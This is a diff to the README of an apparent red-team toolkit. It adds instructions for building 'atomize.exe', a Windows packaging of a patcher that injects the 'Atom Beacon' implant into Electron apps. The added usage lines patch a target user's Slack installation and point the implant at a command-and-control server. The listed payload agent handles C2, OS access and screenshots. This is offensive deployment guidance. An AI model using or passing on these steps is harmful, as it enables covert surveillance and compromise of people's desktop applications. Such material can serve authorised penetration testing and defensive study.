@@ -451,6 +451,25 @@ The Atom Beacon implant is injected into Electron desktop applications using the
 - **Python 3** with no additional pip dependencies (uses a bundled pure-Python ASAR library)
 - **Target Electron app** — the app's `resources/app.asar` or `resources/app/` directory
 
+#### Building a Windows Executable
+
+On Linux and macOS, `atomize.py` can be run directly with Python 3. On Windows, Python may not be installed. You can build a standalone `atomize.exe` using [PyInstaller](https://pyinstaller.org/):
+
+```bash
+cd atom-beacon
+pip install pyinstaller
+pyinstaller atomize.spec
+```
+
+This produces `dist/atomize.exe` — a single-file executable that bundles Python, the ASAR library, and the payload files. No Python installation is needed on the target Windows machine. Usage is identical to the Python version:
+
+```
+atomize.exe --detect-only C:\Users\target\AppData\Local\slack\app-4.40.0
+atomize.exe --server https://10.0.0.1:8444 C:\Users\target\AppData\Local\slack\app-4.40.0
+```
+
+> **Note:** PyInstaller can only build for the OS it runs on. To build a Windows `.exe`, run PyInstaller on a Windows machine (or a Windows VM/CI runner).
+
 #### Analyzing a Target
 
 Before patching, use `--detect-only` to analyze the target app's structure, security settings, and code signing status:
@@ -1020,6 +1039,7 @@ JS-Tap/
 │   └── src-firefox-extension/  # Legacy Firefox MV2 template
 ├── atom-beacon/            # Electron app implant patcher
 │   ├── atomize.py          # Patcher CLI (analyze + patch Electron apps)
+│   ├── atomize.spec        # PyInstaller spec for building atomize.exe (Windows)
 │   ├── asar.py             # Pure-Python ASAR archive handling (extract/pack/patch)
 │   └── payload/
 │       ├── atom-agent.js   # Main process agent (C2, encryption, OS access, screenshots)
